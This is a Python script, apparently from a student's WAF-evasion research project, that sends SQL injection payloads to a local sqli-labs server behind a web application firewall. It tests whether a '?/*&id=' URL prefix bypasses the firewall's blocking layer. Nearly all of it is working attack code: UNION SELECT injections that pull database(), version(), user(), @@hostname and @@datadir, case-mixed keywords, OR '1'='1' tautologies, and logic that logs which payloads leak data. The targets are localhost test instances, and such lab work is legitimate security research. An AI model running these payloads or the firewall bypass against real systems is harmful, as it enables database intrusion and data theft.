"""
bypass_lab/test_final.py
=========================
Test sistematis: apakah ?/*&id= bypass BLOCKING layer
untuk function calls dan string markers?

Dari attack log: bypass payloads muncul sebagai "SQL Inj Audited"
tapi tetap HTTP 200 — ada dua detection layer:
  1. Blocking layer → HTTP 403
  2. Logging layer → "Audited" di log, tidak block

Kalau ?/* bypass blocking layer untuk function calls → kita bisa
extract database name via HTTP 200 response.

Run:
    python3 -m bypass_lab.test_final
"""
import sys, time
sys.path.insert(0, '/mnt/d/Kuliah/RL/SeqSQLi')
import requests

PLAIN  = "http://localhost:8081/Less-1/"
WAF    = "http://localhost:8888/Less-1/"
WAFPFX = "http://localhost:8888/Less-1/?/*&id="   # ?/* prefix

CHAR_S = "CHAR(83,69,81,83,81,76,73,95,83,84,65,82,84)"
CHAR_E = "CHAR(83,69,81,83,81,76,73,95,69,78,68)"
HEX_S  = "0x534551534c495f5354415254"
HEX_E  = "0x534551534c495f454e44"
FOUND  = []


def req(base_url, payload, use_params=True):
    try:
        if use_params:
            r = requests.get(base_url, params={"id": payload}, timeout=8)
        else:
            r = requests.get(base_url + requests.utils.quote(payload,
                             safe="',-./0@_~"), timeout=8)
        idx = r.text.find("Your Login name:")
        val = r.text[idx+16:idx+60].split("<")[0].strip() if idx >= 0 else ""
        return r.status_code, val
    except:
        return 0, ""


def t(label, payload):
    # Normal WAF (id param)
    sn, vn = req(WAF, payload)
    # ?/* prefix WAF
    sp, vp = req(WAFPFX, payload, use_params=False)
    # Plain backend
    spl, vpl = req(PLAIN, payload)

    tn = "BLOCK" if sn == 403 else ("DATA" if vn else "pass")
    tp = "BLOCK" if sp == 403 else ("DATA!" if vp else "pass")

    print(f"  normal={tn:<8} ?/*={tp:<10} plain={bool(vpl)} | {label}")
    if vp:
        print(f"    ?/* returned: {repr(vp[:50])}")
        FOUND.append((label, payload, vp))
    time.sleep(0.25)


print("=" * 70)
print(" FINAL TEST: ?/*&id= bypass untuk data extraction")
print("=" * 70)

# ── Konfirmasi baseline ────────────────────────────────────────────────
print("\n[0] Baseline")
t("numeric bypass (should PASS both)",
  ".1-- -'/0 UNION ALL SELECT 1,99999,88888'")
t("direct database() no prefix (should BLOCK normal, ?)",
  ".1-- -'/0 UNION ALL SELECT 1,database(),2'")

# ── Function calls via ?/* ─────────────────────────────────────────────
print("\n[1] Function calls via ?/* — apakah blocking layer ter-bypass?")
for fn in ["database()", "SCHEMA()", "version()", "user()",
           "DATABASE()", "VERSION()", "USER()"]:
    t(fn, f".1-- -'/0 UNION ALL SELECT 1,{fn},2'")

# ── Markers via ?/* ───────────────────────────────────────────────────
print("\n[2] String markers via ?/* prefix")
t("CHAR markers", f".1-- -'/0 UNION ALL SELECT 1,{CHAR_S},{CHAR_E}'")
t("hex markers",  f".1-- -'/0 UNION ALL SELECT 1,{HEX_S},{HEX_E}'")
t("CHAR+database()", f".1-- -'/0 UNION ALL SELECT database(),{CHAR_S},{CHAR_E}'")

# ── Standard UNION bypass via ?/* ─────────────────────────────────────
print("\n[3] Standard payloads via ?/* (skip bypass trick)")
t("standard UNION+canary",
  "-1' UNION SELECT database(),'SEQSQLI_START','SEQSQLI_END'-- -")
t("standard UNION case",
  "-1' uNiOn sElEcT database(),'SEQSQLI_START','SEQSQLI_END'-- -")
t("standard OR boolean",
  "1' OR '1'='1")
t("basic 1=1",
  "1' AND 1=1-- -")

# ── @@variables via ?/* ───────────────────────────────────────────────
print("\n[4] @@variables via ?/*")
for var in ["@@version", "@@hostname", "@@datadir", "CURRENT_USER",
            "CURRENT_DATE", "CURRENT_TIMESTAMP"]:
    t(var, f".1-- -'/0 UNION ALL SELECT 1,{var},2'")

# ── Summary ───────────────────────────────────────────────────────────
print("\n" + "=" * 70)
print(f" DATA EXTRACTED via ?/* prefix: {len(FOUND)}")
for label, p, val in FOUND:
    print(f"\n  {label}: {repr(val[:50])}")
    print(f"  payload: {p[:90]}")
